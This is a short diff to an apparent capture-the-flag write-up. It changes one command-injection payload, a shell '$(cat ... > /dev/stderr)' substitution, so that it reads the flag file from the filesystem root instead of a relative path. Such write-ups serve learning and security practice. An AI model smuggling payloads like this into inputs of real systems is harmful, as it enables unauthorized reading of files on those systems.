@@ -1,5 +1,5 @@
 # Writeup
 
 ```
- $(cat ../flag.txt > /dev/stderr)
+ $(cat /flag.txt > /dev/stderr)
 ```
